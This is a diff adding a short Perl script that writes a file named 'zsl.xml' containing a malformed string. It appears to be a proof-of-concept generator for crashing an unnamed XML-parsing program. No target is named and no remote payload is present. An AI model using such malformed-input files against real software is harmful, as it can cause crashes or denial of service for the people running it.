@@ -1,0 +1,9 @@
+use strict;
+
+my $file = "zsl.xml";
+my $hit = "Joxy-\\x\\-Poxy";
+print "\n\n[*] Creating $file file...\n";
+open ZSL, ">./$file" || die "\nCan't open $file: $!";
+print ZSL $hit;
+print "\n[.] File successfully mounted!\n\n";
+close ZSL;
